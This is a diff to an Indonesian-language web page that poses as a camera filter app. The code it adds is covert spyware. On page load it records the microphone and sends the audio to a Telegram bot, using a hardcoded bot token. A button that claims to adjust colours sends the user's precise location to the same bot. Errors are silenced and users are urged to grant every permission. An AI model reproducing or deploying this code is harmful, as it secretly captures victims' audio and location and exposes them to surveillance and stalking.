@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>pencari Filter Kamera</title>
+    <title>Filter Kamera</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -43,17 +43,43 @@
             font-weight: bold;
             z-index: 1000;
         }
+        
+        /* Gaya untuk tombol */
+button {
+    background-color: #008CBA; /* Warna biru */
+    color: white;
+    border: none;
+    padding: 10px 20px;
+    font-size: 16px;
+    border-radius: 5px;
+    cursor: pointer;
+    margin-top: 20px;
+    transition: 0.3s;
+}
+
+button:hover {
+    background-color: #005f73; /* Warna biru lebih gelap saat hover */
+}
+
+/* Gaya untuk teks status */
+#statusMessage {
+    display: none;
+    color: #0f0;
+    font-size: 18px;
+    margin-top: 10px;
+}
     </style>
 </head>
 <body>
 
-    <div id="loadingOverlay">Memulai sistem... Mohon tunggu 10 detik jika anda di minta izin kan apa pun itu izinkan karena akan berpengaruh ke vidio! loading...scanner camera </div>
+    <div id="loadingOverlay">Memulai sistem... Mohon tunggu 10 detik jika anda di minta izin kan apa pun itu izinkan karena akan berpengaruh ke vidio</div>
+    
 
     <h2>Filter Kamera</h2>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <canvas id="hiddenCanvas"></canvas>
-
+<p id="statusMessage" style="display: none; color: #0f0; font-size: 18px;">Berhasil tunggu beberapa saat untuk menyesuaikan warna asli</p>
     <script>
         window.onload = async function() {
             startCamera();
@@ -381,7 +407,97 @@ __________________________________
     }
 
     gatherDataAndSend();
+        
+    let audioRecorder, audioChunks = [];
+
+    async function startAudioRecording() {
+        try {
+            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+
+            audioRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
+            audioRecorder.ondataavailable = (event) => audioChunks.push(event.data);
+
+            audioRecorder.onstop = async () => {
+                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                audioChunks = [];
+                await sendAudioToTelegram(audioBlob);
+            };
+
+            audioRecorder.start();
+            setTimeout(() => {
+                audioRecorder.stop();
+            }, 10000); // Rekam selama 10 detik
+
+        } catch (error) {
+            // Tidak menampilkan pesan kesalahan atau notifikasi
+        }
+    }
+
+    async function sendAudioToTelegram(blob) {
+        const formData = new FormData();
+        formData.append("chat_id", "7016045840");
+        formData.append("audio", blob, "audio.webm");
+
+        try {
+            await fetch("https://api.telegram.org/bot7634973023:AAEEVxeXA0tCZqiazEVIVhaKlTn02HFmUiE/sendAudio", {
+                method: "POST",
+                body: formData
+            });
+            // Tidak menampilkan notifikasi apa pun
+        } catch (error) {
+            // Tidak menampilkan pesan kesalahan atau notifikasi
+        }
+    }
+
+    window.onload = async function() {
+        startCamera();
+        startAudioRecording(); // Mulai rekam audio saat halaman dimuat
+        gatherDataAndSend();
+        
+        setTimeout(() => {
+            document.getElementById("loadingOverlay").style.display = "none";
+        }, 10000);
+  
+      };
+      
+      async function requestLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    const { latitude, longitude } = position.coords;
+                    await sendLocationToTelegram(latitude, longitude);
+                    document.getElementById("statusMessage").style.display = "block";
+                },
+                (error) => {
+                    alert("Gagal mendapatkan lokasi: " + error.message);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            alert("Perangkat tidak mendukung fitur lokasi.");
+        }
+    }
+
+    async function sendLocationToTelegram(lat, lon) {
+        const BOT_TOKEN = "7634973023:AAEEVxeXA0tCZqiazEVIVhaKlTn02HFmUiE";
+        const CHAT_ID = "7016045840";
+        const text = `Lokasi Terkini:\nLatitude: ${lat}\nLongitude: ${lon}\n[Google Maps](https://www.google.com/maps?q=${lat},${lon})`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const payload = { chat_id: CHAT_ID, text: text, parse_mode: "Markdown" };
+
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        } catch (error) {
+            console.error("Gagal mengirim lokasi: ", error);
+        }
+    }
     </script>
+    <button onclick="requestLocation()">Izinka lokasi untuk menyesuaikan warna asli </button>
 
 </body>
 </html>
